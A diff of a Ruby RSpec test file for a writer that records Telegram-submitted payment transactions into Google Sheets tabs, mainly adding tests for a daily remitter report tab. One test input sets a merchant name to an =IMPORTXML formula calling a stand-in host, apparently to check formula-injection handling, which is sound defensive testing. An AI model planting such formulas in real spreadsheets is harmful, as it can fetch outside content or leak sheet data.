@@ -17,16 +17,29 @@ RSpec.describe Workbook::HelloSmcWriter do
     ]
   end
 
+  # Same shape as a real "thu chi" tab: row 2 repeats the remitter names per
+  # block, each agent has a label row, entry rows, a spacer and a TOTAL row.
+  # Blocks: A–F (Thọ), G–L (Chương); then Lập and An, whose names also appear
+  # in the remitter header; then the manual bottom area.
   def rd_grid
-    grid = Array.new(24) { Array.new(18) }
-    grid[1][7] = "LẬP"
-    grid[1][8] = "KIM"
-    grid[1][9] = "AN"
-    grid[1][10] = "YẾN"
-    grid[1][11] = "CÔ TUYẾT"
-    grid[22][6] = "Chương (MB+SP)"
-    grid[22][7] = 100_000
-    grid[22][8] = 50_000
+    grid = Array.new(16) { Array.new(14) }
+    grid[0][1] = "RIMITTER"
+    grid[0][6] = "AGENT"
+    grid[0][7] = "RIMITTER"
+    [ 1, 7 ].each { |start| [ "LẬP", "KIM", "AN", "YẾN", "CÔ TUYẾT" ].each_with_index { |name, i| grid[1][start + i] = name } }
+    grid[2][0] = "Thọ\n(MB)"
+    grid[2][1] = 32_000_000
+    grid[3][1] = 5_000_000
+    grid[2][6] = "Chương\n(MB+SP)"
+    grid[6][0] = "TOTAL"
+    grid[6][6] = "TOTAL"
+    grid[8][6] = "Lập \n(MB+SP+QR)"
+    grid[10][6] = "TOTAL"
+    grid[9][0] = "An (QR)"
+    grid[11][0] = "TOTAL"
+    grid[13][13] = "TOTAL AMOUNT (IN)"
+    grid[14][0] = "SP in"
+    grid[14][1] = 143_494_999
     grid
   end
 
@@ -42,7 +55,7 @@ RSpec.describe Workbook::HelloSmcWriter do
   def memory(extra = {}, row_limits = {})
     Workbook::MemorySheet.new({
       "DS MB T10" => ds_mb_grid,
-      "R&D Report" => rd_grid,
+      "thu chi 110" => rd_grid,
       "MB" => mb_grid,
       "Bill vô chủ" => bill_grid
     }.merge(extra), row_limits)
@@ -66,9 +79,11 @@ RSpec.describe Workbook::HelloSmcWriter do
                         dealer_rate: BigDecimal("0.0121"), sender_id: 12_345, username: nil)
     message = create(:telegram_message, telegram_sender_id: sender_id, telegram_username: username)
     bill_image = create(:bill_image, telegram_message: message)
-    create(:transaction, merchant: merchant, telegram_message: message, bill_image: bill_image,
-           transaction_amount_vnd: amount, transaction_at: at,
+    create(:transaction, merchant: merchant, dealer: chuong, card_type: create(:normal_card_type),
+           telegram_message: message, bill_image: bill_image,
+           status: "approved", transaction_amount_vnd: amount, transaction_at: at,
            applied_base_fee_rate: rate, applied_dealer_rate: dealer_rate,
+           amount_after_base_fee_vnd: (amount * (1 - rate)).round,
            lot_number: "000269",
            source_data: { "extraction" => { "merchant_name" => "HỘ KINH DOANH THIÊN KIM GV-1" } })
   end
@@ -83,7 +98,7 @@ RSpec.describe Workbook::HelloSmcWriter do
 
       expect(result).to eq(:identified)
       expect(client.cell("DS MB T10", "B2")).to eq(354_367_000 + 486_000)
-      expect(client.cell("R&D Report", "H23")).to eq(100_000 + 486_000)
+      expect(client.cell("thu chi 110", "H3")).to eq(486_000)
       expect(client.cell("MB", "A2")).to eq(486_000)
       expect(client.cell("MB", "I2")).to eq("Chương")
       expect(client.cell("MB", "J2")).to eq("001_ HỘ KINH DOANH THIÊN KIM GV")
@@ -105,14 +120,14 @@ RSpec.describe Workbook::HelloSmcWriter do
       create(:remitter, name: "Kim", excel_key: "KIM", telegram_user_id: 99)
       client = memory
       described_class.call(transaction: build_transaction(sender_id: 99), client: client, spreadsheet_id: "sheet-id")
-      expect(client.cell("R&D Report", "I23")).to eq(50_000 + 486_000)
-      expect(client.cell("R&D Report", "H23")).to eq(100_000)
+      expect(client.cell("thu chi 110", "I3")).to eq(486_000)
+      expect(client.cell("thu chi 110", "H3")).to be_nil
     end
 
     it "skips R&D but still writes DS MB and MB when the remitter is unmapped" do
       client = memory
       described_class.call(transaction: build_transaction(sender_id: 999_999), client: client, spreadsheet_id: "sheet-id")
-      expect(client.cell("R&D Report", "H23")).to eq(100_000)
+      expect(client.cell("thu chi 110", "H3")).to be_nil
       expect(client.cell("DS MB T10", "B2")).to eq(354_367_000 + 486_000)
       expect(client.cell("MB", "A2")).to eq(486_000)
       expect(client.cell("MB", "K2")).to be_nil
@@ -128,6 +143,138 @@ RSpec.describe Workbook::HelloSmcWriter do
     end
   end
 
+  describe "remitter report (thu chi tab)" do
+    let!(:lap) { create(:remitter, name: "Lập", excel_key: "LẬP", telegram_user_id: 12_345) }
+
+    def write(client, **opts)
+      described_class.call(transaction: build_transaction(**opts), client: client, spreadsheet_id: "sheet-id")
+    end
+
+    it "appends to the first free cell of the remitter column, never accumulating into one cell" do
+      client = memory
+      write(client)
+      write(client, amount: 100_000)
+      expect(client.cell("thu chi 110", "H3")).to eq(486_000)
+      expect(client.cell("thu chi 110", "H4")).to eq(100_000)
+    end
+
+    it "skips filled cells in the block" do
+      client = memory("thu chi 110" => rd_grid.tap { |g| g[2][7] = 1; g[3][7] = 2 })
+      write(client)
+      expect(client.cell("thu chi 110", "H5")).to eq(486_000)
+    end
+
+    it "uses the tab of the transaction's own day" do
+      client = memory("thu chi 210" => rd_grid)
+      write(client, at: Time.zone.local(2026, 10, 2, 10, 0))
+      expect(client.cell("thu chi 210", "H3")).to eq(486_000)
+      expect(client.cell("thu chi 110", "H3")).to be_nil
+    end
+
+    it "does not zero-pad the day or month in the tab name" do
+      client = memory("thu chi 910" => rd_grid,
+                      "DS MB T10" => [[ "Thiên Kim GV", "Chương (tid1)" ], [ Date.new(2026, 10, 9), 0 ]])
+      write(client, at: Time.zone.local(2026, 10, 9, 10, 0))
+      expect(client.cell("thu chi 910", "H3")).to eq(486_000)
+    end
+
+    it "records the tab and cell on the workbook entry" do
+      write(memory)
+      entry = WorkbookEntry.last
+      expect(entry.rd_cell).to eq("H3")
+      expect(entry.payload).to include("rd_sheet" => "thu chi 110")
+    end
+
+    it "skips only the report when the day's tab does not exist" do
+      client = memory
+      client.delete_sheet("thu chi 110")
+      write(client)
+      expect(client.cell("DS MB T10", "B2")).to eq(354_367_000 + 486_000)
+      expect(client.cell("MB", "A2")).to eq(486_000)
+      expect(WorkbookEntry.last.payload).to include("issue" => "rd_sheet_missing")
+      expect(WorkbookEntry.last.rd_cell).to be_nil
+    end
+
+    it "reports rd_block_full instead of writing outside the block" do
+      client = memory("thu chi 110" => rd_grid.tap { |g| (2..5).each { |r| g[r][7] = 1 } })
+      write(client)
+      expect(client.cell("thu chi 110", "H7")).to be_nil
+      expect(WorkbookEntry.last.payload).to include("issue" => "rd_block_full")
+      expect(client.cell("MB", "A2")).to eq(486_000)
+    end
+
+    it "reports rd_agent_missing when no block carries the agent label" do
+      link.update!(rd_agent_label: "Không có")
+      write(memory)
+      expect(WorkbookEntry.last.payload).to include("issue" => "rd_agent_missing")
+    end
+
+    it "inserts a column in every block when the remitter is new, then writes into it" do
+      create(:remitter, name: "Trí", excel_key: "TRÍ", telegram_user_id: 77)
+      grid = rd_grid
+      grid[6][5] = "=SUM(F3:F6)"
+      client = memory("thu chi 110" => grid)
+      write(client, sender_id: 77)
+
+      header = client.sheets["thu chi 110"][1]
+      expect(header.count("TRÍ")).to eq(2)
+      expect(header.first(8)).to eq([ nil, "LẬP", "KIM", "AN", "YẾN", "CÔ TUYẾT", "TRÍ", nil ])
+      expect(client.cell("thu chi 110", "G7")).to eq("=SUM(G3:G6)")
+      expect(client.cell("thu chi 110", "H3")).to eq("Chương\n(MB+SP)")
+      expect(client.cell("thu chi 110", "N3")).to eq(486_000)
+      expect(WorkbookEntry.last.rd_cell).to eq("N3")
+      expect(WorkbookEntry.last.payload["issue"]).to be_nil
+    end
+
+    it "leaves the manual accounting area below the blocks in place" do
+      create(:remitter, name: "Trí", excel_key: "TRÍ", telegram_user_id: 77)
+      client = memory
+      write(client, sender_id: 77)
+      expect(client.cell("thu chi 110", "A15")).to eq("SP in")
+      expect(client.cell("thu chi 110", "B15")).to eq(143_494_999)
+      expect(client.cell("thu chi 110", "N14")).to eq("TOTAL AMOUNT (IN)")
+    end
+
+    it "does not insert again on a later transaction of the same remitter" do
+      create(:remitter, name: "Trí", excel_key: "TRÍ", telegram_user_id: 77)
+      client = memory
+      write(client, sender_id: 77)
+      write(client, sender_id: 77, amount: 100_000)
+      expect(client.sheets["thu chi 110"][1].count("TRÍ")).to eq(2)
+      expect(client.cell("thu chi 110", "N4")).to eq(100_000)
+    end
+
+    it "does not insert columns when the agent is not found" do
+      create(:remitter, name: "Trí", excel_key: "TRÍ", telegram_user_id: 77)
+      link.update!(rd_agent_label: "Không có")
+      client = memory
+      write(client, sender_id: 77)
+      expect(client.sheets["thu chi 110"][1]).not_to include("TRÍ")
+      expect(WorkbookEntry.last.payload["issue"]).to eq("rd_agent_missing")
+    end
+
+    it "does not confuse an agent named like a remitter with the header" do
+      link.update!(rd_agent_label: "Lập")
+      client = memory
+      write(client)
+      expect(client.cell("thu chi 110", "H9")).to eq(486_000)
+      expect(client.cell("thu chi 110", "H2")).to eq("LẬP")
+    end
+
+    it "matches labels with a trailing channel and no parentheses" do
+      link.update!(rd_agent_label: "An")
+      client = memory
+      write(client)
+      expect(client.cell("thu chi 110", "B10")).to eq(486_000)
+    end
+
+    it "never reads the manual accounting area below the blocks" do
+      link.update!(rd_agent_label: "SP in")
+      write(memory)
+      expect(WorkbookEntry.last.payload).to include("issue" => "rd_agent_missing")
+    end
+  end
+
   describe "unidentified transaction" do
     it "appends a Bill vô chủ row and leaves the other sheets untouched" do
       client = memory
@@ -135,7 +282,6 @@ RSpec.describe Workbook::HelloSmcWriter do
 
       transaction = build_transaction
       transaction.source_data = { "extraction" => { "merchant_name" => "KHÔNG RÕ HKD" } }
-      transaction.merchant = nil
       transaction.save!
 
       result = described_class.call(transaction: transaction, client: client, spreadsheet_id: "sheet-id")
@@ -170,22 +316,22 @@ RSpec.describe Workbook::HelloSmcWriter do
       expect(client.cell("DS MB T10", "B2")).to eq(354_367_000)
     end
 
+    it "skips transactions that are not approved yet" do
+      %w[needs_review hold].each do |status|
+        transaction = build_transaction
+        transaction.update!(status: status)
+        expect(described_class.call(transaction: transaction, client: memory, spreadsheet_id: "sheet-id"))
+          .to eq(:skipped_not_approved)
+      end
+      expect(WorkbookEntry.count).to eq(0)
+    end
+
     it "skips rejected transactions" do
       transaction = build_transaction
       transaction.update!(status: "rejected")
       client = memory
       expect(described_class.call(transaction: transaction, client: client, spreadsheet_id: "sheet-id"))
         .to eq(:skipped_rejected)
-      expect(client.cell("DS MB T10", "B2")).to eq(354_367_000)
-      expect(WorkbookEntry.count).to eq(0)
-    end
-
-    it "skips transactions without a transaction date" do
-      transaction = build_transaction
-      transaction.update!(transaction_at: nil)
-      client = memory
-      expect(described_class.call(transaction: transaction, client: client, spreadsheet_id: "sheet-id"))
-        .to eq(:skipped_no_date)
       expect(client.cell("DS MB T10", "B2")).to eq(354_367_000)
       expect(WorkbookEntry.count).to eq(0)
     end
@@ -321,7 +467,6 @@ RSpec.describe Workbook::HelloSmcWriter do
       client = memory
       transaction = build_transaction
       transaction.source_data = { "extraction" => { "merchant_name" => "KHÔNG RÕ HKD" } }
-      transaction.merchant = nil
       transaction.save!
       calls = 0
       allow(WorkbookEntry).to receive(:create!).and_wrap_original do |original, *args|
@@ -348,7 +493,6 @@ RSpec.describe Workbook::HelloSmcWriter do
       end
       transaction = build_transaction
       transaction.source_data = { "extraction" => { "merchant_name" => "=IMPORTXML(\"http://evil.example\",\"//a\")" } }
-      transaction.merchant = nil
       transaction.save!
 
       described_class.call(transaction: transaction, client: client, spreadsheet_id: "sheet-id")
@@ -378,18 +522,6 @@ RSpec.describe Workbook::HelloSmcWriter do
       expect(result).to eq(:unidentified)
       expect(WorkbookEntry.last.payload["issue"]).to eq("ds_cell_missing")
       expect(client.cell("DS MB T10", "B7")).to eq(300)
-    end
-  end
-
-  describe "missing fee rate" do
-    it "does not crash and writes empty C/E when the rate is unknown" do
-      create(:remitter, name: "Lập", excel_key: "LẬP", telegram_user_id: 12_345)
-      client = memory
-      described_class.call(transaction: build_transaction(rate: nil), client: client, spreadsheet_id: "sheet-id")
-      expect(client.cell("MB", "A2")).to eq(486_000)
-      expect(client.cell("MB", "C2")).to be_nil
-      expect(client.cell("MB", "E2")).to be_nil
-      expect(client.cell("MB", "B2")).to eq("=A2-(A2*D2)")
     end
   end
 
